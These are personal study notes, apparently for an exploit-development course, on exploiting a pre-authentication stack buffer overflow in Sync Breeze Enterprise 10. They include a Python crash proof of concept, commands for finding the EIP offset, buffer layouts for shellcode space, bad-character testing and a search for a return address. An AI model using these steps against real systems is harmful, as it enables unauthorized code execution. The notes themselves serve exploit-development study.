## Windows Summary
1. Find input fields to the program
Use a script to recreate packet and spam variable input
2. Fuzz (give long strings to) any inputs to create a crash/error, locating a vulnerable input
3. Overflow to EIP (instruction pointer), verifiable using a debugger on the program process
4. Find space for shellcode ie. overflow into as much memory space as possible
5. Find a jump instruction to a register in the overflow space eg. JMP ESP
6. Point EIP to that instruction address (must be in a static location)
7. Overflow shellcode into the pointed to space. 

NOP Sleds

### Limited ESP space? 
Use jump code to access in ESP space to get to another overflowable register space

### DEP (Data Execution Prevention)
Hardware and software memory checks to prevent malicious code. Raises an exception when loads from data pages are attempted.

### ASLR (Address Space Layout Randomization)
Randomizes base addresses of programs and DLLs every time the OS is booted.

### CFG (Control Flow Guard)
Microsoft's version of CFI (Control Flow Integrity), validates indirect code branches (like a call to a register / CALL EAX) to prevent overwrite of function pointers

# Sync Breeze Example

[[WinDbg]]
### Sync Breeze Vulnerability
A buffer overflow was found in the username field of the HTTP POST login request
**Pre-Authentication Buffer Overflow**

Methods for discovering buffer overflow
1. Source code review (if available)
2. Reverse engineering
3. Fuzzing

Python proof of concept:
```
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

### Install Sync Breeze Enterprise 10
- Run from installer
- Options -> Sever -> Enable web access on port 80
- Attach WinDbg (run as admin w/ shift right click from taskbar)
- Keep services.msc up to restart the service when it dies
- `g` to continue service

### Crash the Application
- Run the Python POC from a VPN connected device
- Inspect the memory and error as an "Access Violation"
- This proves that data has overflowed into the EIP

### Control EIP
- Binary tree analysis to isolate EIP; 400 A's, 400 B's. EIP is written with B's, send 400 A's, 200 B's, 200 C's, etc.
- Or, send a long, non-repeating string of 4 byte chunks with:
	- `msf-pattern_create -l 800` ( [[Metasploit]] )
- Then check the EIP memory location with:
	- `msf-pattern_offset -l 800 -q 42306142` -> `Exact match of offset 780` (where 42306142 is the value in the EIP when the overflow occurred)
 - Edit script buffer with targeted EIP access:
 ```
 filler = b"A" * 780
 eip = b"B" * 4
 buffer = b"C" * 16
 overflow = filler + eip + buffer
```
- After running again, we inspect the registers
	- `dds esp L3` to print next 3 double words from ESP and we notice it points to our buffer of C's
	- `dds esp -10 L8` to print the previous 16 bytes (-10 is hex for -16), showing that there is some space between EIP and ESP that got overflowed

### Overflow for Shellcode
- Create room for shellcode, about 350-400 bytes
- Starting from the ESP, insert a buffer for new shellcode, but ensure that the new buffer amount doesn't change the nature of the crash error
```
 filler = b"A" * 780
 eip = b"B" * 4
 buffer = b"C" * 4 #space between EIP and ESP
 shellcode = b"d" * 1600
 overflow = filler + eip + buffer + shellcode
```
- `dd esp -10 L10` to get a view of each of the overflowed sections
- `dd esp+630 L10` to view end of shellcode buffer range, where 630 is hex for (just shy of) 1600, which is the value of bytes we used for the shellcode

### Check Bad Characters
- Some characters have to be avoided because either the input field or program will sanitize them or process them in unexpected ways, interrupting the shellcode
- send a buffer of all char codes as shellcode to progressively filter out bad chars, ie. `\x01\x02\x03...\xf0`
	- `db esp -10 LXXX` : to view shellcode chars buffer and see which chars are breaking (breaking chars will interrupt the overflow, causing all chars afterwards to not come through)
- Remove these from the script until chars make it through uninterrupted

### Find a Return Address
- Due to randomization protections and threading we cannot "hard code" an ESP into the EIP overflow (as it changes on every execution)
- Find a JMP ESP instruction with a static location
	- this eliminates any libraries compiled with ASLR, and the instruction cannot contain bad chars
Manually Check a Module's `DllCharacteristics` :
- Check the `DllCharacteristics` field: In the PE (Portable Executable) header, find the `IMAGE_DOS_HEADER` (at the start of module) -> `IMAGE_NT_HEADERS` offset -> `IMAGE_OPTIONAL_HEADER` offset. 
  Example for syncbrs
	- `lm m syncbrs` -> "start 00400000"
	- `dt ntdll!_IMAGE_DOS_HEADER 0x00400000` -> "e_lfanew : 0n232" (integer, converts to hex as 0xe8)
	- `dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8` -> "0x018"
	- `dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x018` -> "DllCharacteristics : 0" (meaning there are no protections)
- But... in this example, we see ImageBase is hard set at `0x400000` meaning we will have to input 0x00's (null terminators) into EIP, and those will be mangled on input
TOOL!!!!